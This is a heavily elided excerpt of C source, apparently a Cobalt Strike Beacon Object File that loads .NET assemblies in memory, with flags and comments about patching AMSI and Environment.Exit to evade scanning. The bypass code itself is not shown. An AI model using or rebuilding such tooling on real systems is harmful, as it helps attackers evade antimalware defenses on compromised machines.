...
int go(char* args, ULONG length)
{
	...
	if (!Executedotnet(assemblyBytes, assemblyByteLen, assemblyArguments, &OutputBuffer, &OutputLength, patchExitflag, patchAmsiflag)) {
		BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed inline-ea!\n");
		return -1;
	}
...
BOOL Executedotnet(PBYTE AssemblyBytes, ULONG AssemblySize, LPCWSTR wAssemblyArguments, LPSTR* OutputBuffer, ULONG* OutputLength, BOOL patchExitflag, BOOL patchAmsiflag) // Heavily modified but credits to Maldev Academy and Anthemtotheego for the skeleton where I could then work on bypasses
{
	...
	*/
	...
	if (HResult != S_OK)
	{
		BeaconPrintf(CALLBACK_OUTPUT, "[-] AppDomain->Load_3 Failed with Error: %lx\n", HResult); // This will fail if caught by AMSI
	}
	
	if (patchExitflag != 0) {
		BeaconPrintf(CALLBACK_OUTPUT, "[+] Patching System.Environment.Exit\n");
	    if (!patchExit(runtimeHost)) {
			BeaconPrintf(CALLBACK_OUTPUT, "[-] Failed to patch System.Environment.Exit\n");
			return FALSE;
		}
	}
	...
	if (AssemblyArgv) {
		KERNEL32$LocalFree(AssemblyArgv);
